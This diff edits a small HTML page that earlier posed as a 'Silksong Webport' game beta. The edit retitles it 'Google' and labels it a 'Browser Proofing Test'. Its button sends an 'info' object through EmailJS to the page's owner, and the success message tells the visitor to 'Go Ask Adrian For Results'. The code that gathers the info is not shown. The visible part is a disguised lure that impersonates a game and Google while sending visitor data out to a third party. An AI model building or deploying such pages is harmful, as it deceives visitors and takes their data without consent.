@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Silksong Webport</title>
+<title>Google</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
@@ -74,9 +74,9 @@
 <body>
 
 <div class="container">
-    <h1>Silksong Webport</h1>
-    <p>This is a beta test and this will work when it works</p>
-    <button id="send">Open V1</button>
+    <h1>Browser Proofing Test</h1>
+    <p>This test proves the fragility of browser strength</p>
+    <button id="send">Start Test 1</button>
     <pre id="status"></pre>
 </div>
 
@@ -120,7 +120,7 @@ document.getElementById("send").onclick = async () => {
 
     emailjs.send("service_iproogf", "template_8bq4d8i", info)
         .then(() => {
-            status.textContent = "Done.";
+            status.textContent = "Done. Go Ask Adrian For Results";
         })
         .catch(err => {
             status.textContent = "Error: " + err;
